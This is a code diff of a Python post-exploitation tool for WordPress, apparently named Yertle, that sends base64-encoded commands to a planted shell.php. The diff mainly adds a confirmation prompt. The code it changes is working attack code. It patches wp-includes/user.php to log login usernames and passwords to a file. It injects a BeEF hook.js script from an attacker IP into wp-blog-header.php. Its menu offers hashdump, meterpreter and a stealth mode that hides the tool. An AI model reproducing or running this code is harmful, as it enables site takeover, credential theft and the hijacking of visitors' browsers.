@@ -71,7 +71,7 @@ def commandloop(host,uploaddir):
         params = [('cmd', cmd.encode('base64'))]
         if (cmd == "quit") or (cmd == "exit"):
             sys.exit(2)
-        if cmd == "help" or cmd == "?":
+        elif cmd == "help" or cmd == "?":
             print '''
             Core Commands
             =============
@@ -91,19 +91,19 @@ def commandloop(host,uploaddir):
                 stealth                   Hides Yertle from the plugins page
 
                 '''
-        if cmd == "hashdump":
+        elif cmd == "hashdump":
             hashdump(host, uploaddir)
-        if cmd == "shell":
+        elif cmd == "shell":
             shell(host, uploaddir)
-        if cmd == "stealth":
+        elif cmd == "stealth":
             stealth(host, uploaddir)
-        if cmd == "keylogger":
+        elif cmd == "keylogger":
             keylogger(host, uploaddir)
-        if cmd == "keylog":
+        elif cmd == "keylog":
             keylog(host, uploaddir)
-        if cmd == "meterpreter":
+        elif cmd == "meterpreter":
             meterpreter(host, uploaddir)
-        if cmd == "beef":
+        elif cmd == "beef":
             beefhook(host, uploaddir)
         else:
             print "Sent command: " + cmd
@@ -181,6 +181,13 @@ if (class_exists('ReflectionFunction')) {
     requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
 
 
+def warning():
+    cmd = raw_input('This module modifies files within the WordPress core.  Would you like to continue? (Y/n) ')
+    if ("y" in cmd) or("Y" in cmd):
+        return True
+    else:
+        return False
+
 def meterpreter(host,uploaddir):
     ip = raw_input('IP Address: ')
     port = raw_input('Port: ')
@@ -252,31 +259,31 @@ die();
 
 
 def keylogger(host,uploaddir):
+    if warning():
+        hook = '''$credentials['remember'] = false;
+         $file = 'wp-content/plugins/%s/passwords.txt';
+         $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'] . "\n";
+         file_put_contents($file, $credz, FILE_APPEND | LOCK_EX);''' % (uploaddir)
 
-    hook = '''$credentials['remember'] = false;
-     $file = 'wp-content/plugins/%s/passwords.txt';
-     $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'] . "\n";
-     file_put_contents($file, $credz, FILE_APPEND | LOCK_EX);''' % (uploaddir)
+        hook = hook.encode('base64')
+        injector = '''<?php
+    $real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
+    $evil = "%s";
+    $real = base64_decode($real);
+    $evil = base64_decode($evil);
 
-    hook = hook.encode('base64')
-    injector = '''<?php
-$real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
-$evil = "%s";
-$real = base64_decode($real);
-$evil = base64_decode($evil);
-
-$orig=file_get_contents('../../../wp-includes/user.php');
-$orig=str_replace("$real", "$evil",$orig);
-file_put_contents('../../../wp-includes/user.php', $orig);
-?>''' % hook
-    payload = injector.encode('base64')
-    params = [
-        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    params = [
-        ('cmd', 'php backdoor.php'.encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    print sendcommand.text
+    $orig=file_get_contents('../../../wp-includes/user.php');
+    $orig=str_replace("$real", "$evil",$orig);
+    file_put_contents('../../../wp-includes/user.php', $orig);
+    ?>''' % hook
+        payload = injector.encode('base64')
+        params = [
+            ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
+        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        params = [
+            ('cmd', 'php backdoor.php'.encode('base64'))]
+        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        print "wp_signon function patched.  Do not run this more than once.  Use 'keylog' to check the log file."
 
 
 def hashdump(host,uploaddir):
@@ -319,11 +326,12 @@ $conn->close();
 
 
 def beefhook(host,uploaddir):
-    ip = raw_input('IP Address: ')
-    params = [
-        ('cmd',('sed -i \'1i\<script src=\"http://' + ip + ':3000/hook.js\"\>\</script\>\'  ../../../wp-blog-header.php').encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    print sendcommand.text
+    if warning():
+        ip = raw_input('IP Address: ')
+        params = [
+            ('cmd',('sed -i \'1i\<script src=\"http://' + ip + ':3000/hook.js\"\>\</script\>\'  ../../../wp-blog-header.php').encode('base64'))]
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        print "BeEF hook added!  Check BeEF for any hooked clients. Do not run this multiple times."
 
 
 def printbanner():
